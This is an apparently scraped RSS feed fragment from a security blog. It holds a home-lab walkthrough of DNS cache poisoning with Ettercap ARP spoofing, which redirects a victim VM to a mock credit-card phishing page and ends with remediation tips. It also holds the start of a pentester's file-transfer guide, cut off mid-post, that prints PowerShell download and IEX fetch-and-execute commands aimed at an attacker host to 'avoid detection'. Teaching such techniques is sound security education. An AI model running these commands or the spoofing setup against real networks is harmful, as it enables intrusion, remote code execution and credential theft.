&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Bov2hAJHJNLDGy6L-T8Idg.png&#34; alt=&#34;&#34;  /&gt;

As we can see here, I am able to access the webpage. Now we can get to the fun stuff.&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Configuring Ettercap&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Quick Theory&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Ettercap is being used in this context to resolve DNS queries coming from the victim machine. Ettercap will respond to the DNS query with the IP address of the attacking machine (Kali) such that when the victim visits the target domain, they will be redirected to the attacker&amp;rsquo;s IP address instead of the real IP address associated with the domain name.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Editing etter.conf&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Open up your text editor of choice.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo vim etter.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The changes to make are shown in green in the screenshot below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*OC5xz4T3RuZNKlKHAjLlNg.png&#34; alt=&#34;&#34;  /&gt;

&lt;strong&gt;Explanation:&lt;/strong&gt; I set the UID and GID to 0 so that Ettercap has adequate permissions on the machine. In this case, UID and GID 0 are root permissions. I then uncommented lines 179, 180, 183, and 184. The purpose of the &lt;code&gt;redir_commands&lt;/code&gt; is explained best in the &lt;a href=&#34;https://linux.die.net/man/5/etter.conf&#34;&gt;etter.conf man page&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[P]rovide[s] a valid command (or script) to enable tcp redirection at kernel level in order to be able to use SSL dissection.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Editing etter.dns&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Assuming you&amp;rsquo;re using the default configuration file for &lt;code&gt;etter.dns&lt;/code&gt;, all you need to do is skip to the bottom of the file and add the domain name you intend to spoof, the associated A and PTR records, and your attacking IP address.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo vim /etc/ettercap/etter.dns
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6-get-the-ip-address-of-the-victimmachine&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*KcKAb7OJbz_0f5CoNtpJow.png&#34; alt=&#34;&#34;  /&gt;

6. Get the IP Address of the Victim Machine&lt;/h2&gt;
&lt;p&gt;I use &lt;code&gt;ipconfig&lt;/code&gt; to get the IPv4 address of the Windows VM.&lt;/p&gt;
&lt;h2 id=&#34;7-runettercap&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nz7wSTrT_fwsS9C9p12JAA.png&#34; alt=&#34;&#34;  /&gt;

7. Run Ettercap&lt;/h2&gt;
&lt;p&gt;On my Kali machine, I navigate to Applications &amp;gt; 09 — Sniffing &amp;amp; Spoofing &amp;gt; ettercap-graphical in order to open the ettercap GUI.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*NJo2YFgmY4SD6zkBz7DNpA.png&#34; alt=&#34;&#34;  /&gt;

In the upper-right hand corner, I click on the three dots and navigate to Targets &amp;gt; Select targets.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*m54-jnHr4SRYB0rNDpbzIA.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;I have white theme right now, don’t judge&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I then enter the IP address of the victim machine and default gateway and press “OK”. The default gateway can also be found in the &lt;code&gt;ifconfig/ipconfig&lt;/code&gt; command output of the victim machine.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*saKkteivYxqf_WJ6vQ6xnQ.png&#34; alt=&#34;&#34;  /&gt;

Click the Earth icon in the upper right-hand corner and select ARP poisoning.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*iA33LttxmEYOcbNGJ57MDA.png&#34; alt=&#34;&#34;  /&gt;

The default setting is okay here.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Hn7A8k11PR6HrcXcRBD14g.png&#34; alt=&#34;&#34;  /&gt;

Then, click the three dots in the corner again. Go to Plugins &amp;gt; Manage plugins.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*kYuERsIIlgodh6L8wP2RrQ.png&#34; alt=&#34;&#34;  /&gt;

Select &lt;code&gt;dns_spoof&lt;/code&gt; by double-clicking it. You’ll know that you’ve applied the plugin when the asterisk appears to the left of the plugin name.&lt;/p&gt;
&lt;h2 id=&#34;8-visit-the-domain-on-the-victimmachine&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*tNOBptOwGtIEKMVP-E-qOw.png&#34; alt=&#34;&#34;  /&gt;

8. Visit The Domain on the Victim Machine&lt;/h2&gt;
&lt;p&gt;Now, we reap the fruits of our labor.&lt;/p&gt;
&lt;h2 id=&#34;before&#34;&gt;Before&lt;/h2&gt;
&lt;p&gt;This is the webpage that the victim  to see when visiting ecosia.org:&lt;/p&gt;
&lt;h2 id=&#34;after&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*K8cS5-Fsf0b97Zt20E-Vjw.png&#34; alt=&#34;&#34;  /&gt;

After&lt;/h2&gt;
&lt;p&gt;This is the webpage that the victim machine  sees when visiting ecosia.org:&lt;/p&gt;
&lt;h1 id=&#34;remediation&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*YXQSYdj_RbcymtXs2FOMxg.png&#34; alt=&#34;&#34;  /&gt;

Remediation&lt;/h1&gt;
&lt;p&gt;Here are some ways to prevent a DNS Cache Poisoning attack (referenced from &lt;a href=&#34;https://kinsta.com/blog/dns-poisoning/&#34;&gt;here&lt;/a&gt;).&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Use spoofing detection tools&lt;/li&gt;
&lt;li&gt;Have a strong DNS, DHCP, and IPAM (DDI) strategy in place&lt;/li&gt;
&lt;li&gt;Use Domain Name System Security Extensions (DNSSEC). This essentially adds different levels of verification&lt;/li&gt;
&lt;li&gt;Use end-to-end encryption for DNS queries&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;more-reading&#34;&gt;More Reading&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning&#34;&gt;https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://kinsta.com/blog/dns-poisoning/&#34;&gt;https://kinsta.com/blog/dns-poisoning/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Thanks for reading!&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<h2 id="dns-cache-poisoning-on-home-lab-walkthrough">DNS Cache Poisoning on Home Lab Walkthrough</h2>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*P3ZahJWqz8AFbk9s.png" alt="Basic DNS cache poisoning attack"  />

<em><a href="https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png">https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png</a></em></p>
<h1 id="overview">Overview</h1>
<p>In this article, I will be walking you through a common method of implementing DNS cache poisoning on a network. I’ll illustrate my process with screenshots, commands, and explanations. You are welcome to follow along and gain hands-on experience with DNS spoofing to further reinforce the knowledge that you already have.</p>
<h2 id="intended-audience">Intended Audience</h2>
<p>This is intended for a more technical audience. If you’re a beginner, I recommend looking for a more comprehensive tutorial to walk you through all the terminology and commands. For the purposes of this article, I’m assuming that you already have a foundational understanding of Linux, DNS, virtual machines, and potentially troubleshooting. I will not be explaining how DNS cache poisoning works. For more information, you may read the articles linked in the “More Reading” section at the end of this post.</p>
<h2 id="tools-used">Tools Used</h2>
<ul>
<li>Windows VM</li>
<li>Kali VM</li>
<li>Ettercap</li>
<li>Text editor</li>
</ul>
<p>You will also need root/system privileges or sudo abilities on the attacking machine.</p>
<h1 id="practical-demonstration">Practical Demonstration</h1>
<ol>
<li>Find the IP address of your attacker machine</li>
</ol>
<hr>
<p>Since I’m doing this on my LAN, I can use my private IPv4 address, which I truncated from the <code>ifconfig</code> command for the purpose of this demonstration.</p>
<h2 id="2-create-the-landing-page-of-your-malicious-website"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*UY_WaZN3PluXBghyE4c0nA.png" alt=""  />

2. Create the landing page of your malicious website</h2>
<p>Now, we’ll prepare the HTML file that the victim will encounter once the DNS has been spoofed. Since I’m using an Apache webserver, I’ll place the file in the root directory on my machine, which is <code>/var/www/html</code>. This is my file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌──</span>(ally<span style="color:#960050;background-color:#1e0010">㉿</span>kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html]  
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#f92672">$</span> cat index<span style="color:#f92672">.</span>html   
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>title<span style="color:#f92672">&gt;</span>No More Planting Trees<span style="color:#f92672">&lt;/</span>title<span style="color:#f92672">&gt;</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>h1<span style="color:#f92672">&gt;</span>No More Planting Trees<span style="color:#f92672">&lt;/</span>h1<span style="color:#f92672">&gt;</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>h3<span style="color:#f92672">&gt;</span>YouR CaR<span style="color:#e6db74">&#39;s ExteNDeD WarraNTy is AlMosT OuT&lt;/h3&gt;  </span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>p<span style="color:#f92672">&gt;</span>Give me all your PII NOW <span style="color:#f92672">or</span> <span style="color:#66d9ef">else</span> your identity will be stolen <span style="color:#f92672">!!!</span> <span style="color:#f92672">!!&lt;/</span>p<span style="color:#f92672">&gt;</span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>form<span style="color:#f92672">&gt;</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>label <span style="color:#66d9ef">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cc&#34;</span><span style="color:#f92672">&gt;</span>Enter YouR CreDIT CarD Number ASAP <span style="color:#f92672">&lt;</span>b<span style="color:#f92672">&gt;</span>ASAP<span style="color:#f92672">&lt;/</span>b<span style="color:#f92672">&gt;</span> <span style="color:#f92672">!!</span>:<span style="color:#f92672">&lt;/</span>label<span style="color:#f92672">&gt;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>input id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cc&#34;</span> placeholder<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;or else&#34;</span> <span style="color:#f92672">/&gt;</span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>form<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>I then changed the ownership of the file to the service account <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo chown www-data ./index.html
</span></span></code></pre></div><ol start="3">
<li>Start Malicious Web Server</li>
</ol>
<hr>
<p>As stated previously, I’m using Apache, so I just started the<code>apache2</code> service.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*8yqslDbjbDYLIde9DLp0Jw.png" alt=""  />

When I visit <code>[http://127.0.0.1/index.html](http://127.0.0.1/index.html,)</code>, I see my malicious webpage.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*c0hPCdzDnLLWE_0zuWDwtw.png" alt=""  />

<em>No one would actually enter their credit card number here… right??</em></p>
<ol start="4">
<li>Verify Website is Reachable from Victim Computer</li>
</ol>
<hr>
<p>This is pretty simple. I just visit my Kali IPv4 address in the browser of Windy Runner (my VM) to verify that it can be loaded from the Windows machine.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Bov2hAJHJNLDGy6L-T8Idg.png" alt=""  />

As we can see here, I am able to access the webpage. Now we can get to the fun stuff.</p>
<ol start="5">
<li>Configuring Ettercap</li>
</ol>
<hr>
<p><strong>Quick Theory</strong></p>
<p>Ettercap is being used in this context to resolve DNS queries coming from the victim machine. Ettercap will respond to the DNS query with the IP address of the attacking machine (Kali) such that when the victim visits the target domain, they will be redirected to the attacker&rsquo;s IP address instead of the real IP address associated with the domain name.</p>
<p><strong>Editing etter.conf</strong></p>
<p>Open up your text editor of choice.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo vim etter.conf
</span></span></code></pre></div><p>The changes to make are shown in green in the screenshot below.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*OC5xz4T3RuZNKlKHAjLlNg.png" alt=""  />

<strong>Explanation:</strong> I set the UID and GID to 0 so that Ettercap has adequate permissions on the machine. In this case, UID and GID 0 are root permissions. I then uncommented lines 179, 180, 183, and 184. The purpose of the <code>redir_commands</code> is explained best in the <a href="https://linux.die.net/man/5/etter.conf">etter.conf man page</a>:</p>
<blockquote>
<p>[P]rovide[s] a valid command (or script) to enable tcp redirection at kernel level in order to be able to use SSL dissection.</p>
</blockquote>
<p><strong>Editing etter.dns</strong></p>
<p>Assuming you&rsquo;re using the default configuration file for <code>etter.dns</code>, all you need to do is skip to the bottom of the file and add the domain name you intend to spoof, the associated A and PTR records, and your attacking IP address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo vim /etc/ettercap/etter.dns
</span></span></code></pre></div><h2 id="6-get-the-ip-address-of-the-victimmachine"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*KcKAb7OJbz_0f5CoNtpJow.png" alt=""  />

6. Get the IP Address of the Victim Machine</h2>
<p>I use <code>ipconfig</code> to get the IPv4 address of the Windows VM.</p>
<h2 id="7-runettercap"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*nz7wSTrT_fwsS9C9p12JAA.png" alt=""  />

7. Run Ettercap</h2>
<p>On my Kali machine, I navigate to Applications &gt; 09 — Sniffing &amp; Spoofing &gt; ettercap-graphical in order to open the ettercap GUI.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*NJo2YFgmY4SD6zkBz7DNpA.png" alt=""  />

In the upper-right hand corner, I click on the three dots and navigate to Targets &gt; Select targets.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*m54-jnHr4SRYB0rNDpbzIA.png" alt=""  />

<em>I have white theme right now, don’t judge</em></p>
<p>I then enter the IP address of the victim machine and default gateway and press “OK”. The default gateway can also be found in the <code>ifconfig/ipconfig</code> command output of the victim machine.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*saKkteivYxqf_WJ6vQ6xnQ.png" alt=""  />

Click the Earth icon in the upper right-hand corner and select ARP poisoning.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*iA33LttxmEYOcbNGJ57MDA.png" alt=""  />

The default setting is okay here.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Hn7A8k11PR6HrcXcRBD14g.png" alt=""  />

Then, click the three dots in the corner again. Go to Plugins &gt; Manage plugins.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*kYuERsIIlgodh6L8wP2RrQ.png" alt=""  />

Select <code>dns_spoof</code> by double-clicking it. You’ll know that you’ve applied the plugin when the asterisk appears to the left of the plugin name.</p>
<h2 id="8-visit-the-domain-on-the-victimmachine"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*tNOBptOwGtIEKMVP-E-qOw.png" alt=""  />

8. Visit The Domain on the Victim Machine</h2>
<p>Now, we reap the fruits of our labor.</p>
<h2 id="before">Before</h2>
<p>This is the webpage that the victim  to see when visiting ecosia.org:</p>
<h2 id="after"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*K8cS5-Fsf0b97Zt20E-Vjw.png" alt=""  />

After</h2>
<p>This is the webpage that the victim machine  sees when visiting ecosia.org:</p>
<h1 id="remediation"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*YXQSYdj_RbcymtXs2FOMxg.png" alt=""  />

Remediation</h1>
<p>Here are some ways to prevent a DNS Cache Poisoning attack (referenced from <a href="https://kinsta.com/blog/dns-poisoning/">here</a>).</p>
<ol>
<li>Use spoofing detection tools</li>
<li>Have a strong DNS, DHCP, and IPAM (DDI) strategy in place</li>
<li>Use Domain Name System Security Extensions (DNSSEC). This essentially adds different levels of verification</li>
<li>Use end-to-end encryption for DNS queries</li>
</ol>
<h1 id="more-reading">More Reading</h1>
<ul>
<li><a href="https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning">https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning</a></li>
<li><a href="https://kinsta.com/blog/dns-poisoning/">https://kinsta.com/blog/dns-poisoning/</a></li>
</ul>
<p>Thanks for reading!</p>
]]></content:encoded>
    </item>
    <item>
      <title>Pentester’s Guide to Performing File Transfers</title>
      <link>https://ally-petitt.com:443/en/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</link>
      <pubDate>Wed, 08 Jun 2022 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.com:443/en/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HNC0lT4gPMDU8uH0fyjRyw.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;foreword&#34;&gt;Foreword&lt;/h1&gt;
&lt;p&gt;To avoid detection, it is best to use tools that are native to the victim’s computer.&lt;/p&gt;
&lt;h1 id=&#34;ftp-with-windowshost&#34;&gt;FTP with Windows Host&lt;/h1&gt;
&lt;p&gt;While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install vsftpd  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo service vsftpd start  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;service vsftpd status #status should be active
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To check if your server is working, type &lt;code&gt;ftp localhost.&lt;/code&gt; If you see the message “Connected to localhost”, your FTP server is running.&lt;/p&gt;
&lt;h2 id=&#34;accessing-file-with-interactive-shell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ehYiaPXjraslOYhNqIv7Zw.png&#34; alt=&#34;&#34;  /&gt;

Accessing File With Interactive Shell&lt;/h2&gt;
&lt;p&gt;If you have an interactive shell on the Windows machine, run this command.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cscript wget.vbs http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt; &amp;lt;FILENAME TO SAVE AS&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;accessing-file-with-non-interactive-shell&#34;&gt;Accessing File With Non-Interactive Shell&lt;/h2&gt;
&lt;p&gt;If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;storageDir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;pwd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;webclient &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; New&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Object&lt;/span&gt; System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Net&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WebClient &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;output-file.exe&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;webclient&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DownloadFile(&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;url,&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;file) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To invoke&lt;code&gt;wget.ps1&lt;/code&gt;, call&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IEX(New&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Object&lt;/span&gt; Net&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;WebClient)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;downloadString(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;getting-files-through-powershell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nBHrLvu-D9RNlMsbTG3Wsg.jpeg&#34; alt=&#34;&#34;  /&gt;

Getting Files Through PowerShell&lt;/h1&gt;
&lt;p&gt;On your Kali Linux machine, make a copy of the file you want to send to &lt;code&gt;/var/www/html/&lt;/code&gt; . On the Window’s machine, execute the following:&lt;/p&gt;
